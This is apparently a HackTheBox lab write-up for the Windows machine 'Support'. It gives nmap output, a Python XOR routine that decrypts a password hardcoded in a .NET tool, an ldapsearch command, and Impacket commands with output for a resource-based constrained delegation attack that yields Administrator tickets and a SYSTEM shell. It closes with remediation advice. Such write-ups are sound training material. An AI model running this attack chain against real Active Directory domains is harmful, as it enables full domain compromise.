+++
date = '2025-05-20T02:36:30+01:00'
draft = false
title = 'Support'
+++
#  HackTheBox Writeup – Support

**Author**: **blackcaesar0**  
**Team**: **Offensive Security Initiative (OSI)**  
**Machine Name**: Support  
**Difficulty**: Easy  
**Operating System**: Windows  
**Category**: Active Directory, Privilege Escalation  

![](/static/support/support.png)

---

##  Overview

- **Target**: `support.htb,dc.support.htb`
- **Objective**: Gain user and administrator access
- **Techniques Used**:
  - SMB and LDAP enumeration
  - Reverse engineering a .NET executable using  **dnSpy**
  - LDAP user enumeration
  - WinRM shell access
  - Abuse of `GenericAll` rights
  - Resource-Based Constrained Delegation (RBCD)
  - Kerberos ticket impersonation

---

## Initial Enumeration

###  Nmap Scan
  
- Performed a comprehensive Nmap scan to identify open ports and services.
 
 ```sh
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-19 20:41:54Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-19T20:42:11
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 2m32s
```

---

##  SMB Enumeration

- Enumerated SMB shares and discovered a publicly accessible share named `support-tools` containing a file `UserInfo.exe.zip`.

![](/static/support/smb_enum.jpg)

![](/static/support/interesting_zip_file.jpg)

---

## Reverse Engineering .NET Executable

**Tool Used**: **dnSpy**  
**File Analyzed**: `UserInfo.exe`
  
 - Decompiled the `.NET` executable using dnSpy. Identified a hardcoded Base64-encoded string representing an encrypted LDAP password. Located the custom decryption algorithm within the code, which utilized XOR operations.

![](/static/support/encrypted_ldap_pass.jpg)

```python
import base64

enc_password = "encrypted_passwd"
key = b"key"
data = base64.b64decode(enc_password)
decrypted = bytearray()
for i in range(len(data)):
    decrypted.append(data[i] ^ key[i % len(key)] ^ 223)
decrypted.decode("latin1")
```

---

##  LDAP Enumeration
  
- Used the decrypted LDAP credentials to bind anonymously and search Active Directory. Extracted user accounts and discovered that the `support` user had a plaintext password stored in their `info` field.
```sh
ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'ldap_pass' -b "DC=support,DC=htb" "(objectClass=user)"|less
```

![](/static/support/ldapsearch_enum.jpg)


---

##  Gaining User Access

- Logged into the system via WinRM using the user credentials obtained from LDAP enumeration.

![](/static/support/user.jpg)

---

##  Privilege Escalation (BloodHound)
  
- Collected domain object data and analyzed it using BloodHound. Found that the `support` user had `GenericAll` rights over the domain controller’s computer object.

![](/static/support/bloodhound_enum.jpg)

**Explanation of `GenericAll`**:  
The `GenericAll` permission grants full control over an Active Directory object, allowing the user to modify any attribute, including delegation settings. This level of access can be exploited to escalate privileges within the domain.

---

## Exploiting RBCD (Resource-Based Constrained Delegation)
 
- Abused `GenericAll` rights to perform RBCD and impersonate the domain Administrator.

### Step 1: Add Machine Account

```sh
 addcomputer.py -method SAMR -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' -dc-host dc.support.htb -domain-netbios support.htb 'support.htb/owned_user:pass'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Successfully added machine account ATTACKERSYSTEM$ with password Summer2018!.
```

### Step 2: Configure Delegation

```sh
 impacket-rbcd -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' 'support.htb/owned_user:pass'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] ATTACKERSYSTEM$ can now impersonate users on DC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     ATTACKERSYSTEM$   (S-1-5-21-1677581083-3380853377-188903654-6101)
```

### Step 3: Impersonate Administrator and Get TGT

```sh
getST.py -spn 'cifs/dc.support.htb' -impersonate 'Administrator' 'support.htb/attackersystem$:Summer2018!'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache
```

---

## Root Access (Administrator)
  
- Used the forged Kerberos ticket to run `psexec.py` and obtain a SYSTEM shell on the domain controller.

![](/static/support/root.jpg)

---

##  Summary

| Stage                | Technique                                     |
| -------------------- | --------------------------------------------- |
| Enumeration          | Nmap, SMB, LDAP                               |
| Initial Access       | Reverse engineered LDAP credentials           |
| User Access          | WinRM login as `support`                      |
| Privilege Escalation | `GenericAll` → RBCD → S4U2Proxy impersonation |
| Root Access          | SYSTEM shell via forged Kerberos TGT          |

---

## 🛡️ Remediation Advice

- **Avoid Hardcoded Credentials**: Never embed secrets in executables.
- **Restrict Excessive Permissions**: Limit `GenericAll` and similar permissions to necessary accounts only.
- **Control Machine Account Creation**: Restrict the ability to create machine accounts to trusted users.
- **Monitor Delegation Activities**: Implement monitoring for unusual Kerberos delegation activities.
- **Protect Sensitive LDAP Fields**: Apply appropriate Access Control Lists (ACLs) to sensitive LDAP attributes like `info`.

---
